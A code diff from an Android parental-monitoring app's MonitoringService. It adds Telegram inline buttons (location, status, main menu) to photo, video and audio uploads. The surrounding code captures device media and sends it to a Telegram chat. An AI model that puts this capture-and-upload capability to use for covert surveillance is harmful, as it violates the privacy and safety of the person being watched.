@@ -4295,8 +4295,27 @@ class MonitoringService : Service() {
 
     private val menuBarGson = com.google.gson.Gson()
 
-    private fun menuBarBody(): okhttp3.RequestBody {
-        return menuBarGson.toJson(quickMenuBar()).toRequestBody("text/plain".toMediaTypeOrNull())
+    // Markup konteks kiriman media (kemudahan pakai,
+    // keputusan pemilik 2026-11-12): di bawah foto/video/
+    // audio kini ada tombol lanjutan yang paling nyambung
+    // (Lokasi + Status untuk media visual, Status untuk
+    // audio) di atas baris Menu utama, menggantikan baris
+    // Menu utama tunggal yang dulu dipakai semua kiriman.
+    private fun konteksMediaBody(jenis: String): okhttp3.RequestBody {
+        fun button(text: String, data: String) =
+            com.redeye.parentalmonitor.network.InlineButton(text, data)
+        val konteks = if (jenis == "audio") {
+            listOf(button("\uD83D\uDCCA Status", "status"))
+        } else {
+            listOf(
+                button("\uD83D\uDCCD Lokasi", "location"),
+                button("\uD83D\uDCCA Status", "status")
+            )
+        }
+        val markup = com.redeye.parentalmonitor.network.InlineKeyboardMarkup(
+            listOf(konteks, listOf(button("\uD83C\uDFE0 Menu utama", "menu:open")))
+        )
+        return menuBarGson.toJson(markup).toRequestBody("text/plain".toMediaTypeOrNull())
     }
 
     // Saklar on/off di menu (permintaan owner): satu tombol
@@ -14439,7 +14458,7 @@ class MonitoringService : Service() {
             catatUnggahTakPasti(audioFile)
             val audioLock = acquireOpWakeLock("audio", 600_000L)
             val response = try {
-                TelegramMediaClient.api.sendAudio(url, chatIdBody, caption, audioPart, menuBarBody())
+                TelegramMediaClient.api.sendAudio(url, chatIdBody, caption, audioPart, konteksMediaBody("audio"))
             } finally {
                 releaseOpWakeLock(audioLock)
             }
@@ -14709,7 +14728,7 @@ class MonitoringService : Service() {
             catatUnggahTakPasti(videoFile)
             val videoLock = acquireOpWakeLock("video", 600_000L)
             val response = try {
-                TelegramMediaClient.api.sendVideo(url, chatIdBody, caption, videoPart, menuBarBody())
+                TelegramMediaClient.api.sendVideo(url, chatIdBody, caption, videoPart, konteksMediaBody("video"))
             } finally {
                 releaseOpWakeLock(videoLock)
             }
@@ -15605,7 +15624,7 @@ class MonitoringService : Service() {
             catatUnggahTakPasti(photoFile)
             val photoLock = acquireOpWakeLock("photo", 600_000L)
             val response = try {
-                TelegramMediaClient.api.sendPhoto(url, chatIdBody, caption, photoPart, menuBarBody())
+                TelegramMediaClient.api.sendPhoto(url, chatIdBody, caption, photoPart, konteksMediaBody("foto"))
             } finally {
                 releaseOpWakeLock(photoLock)
             }
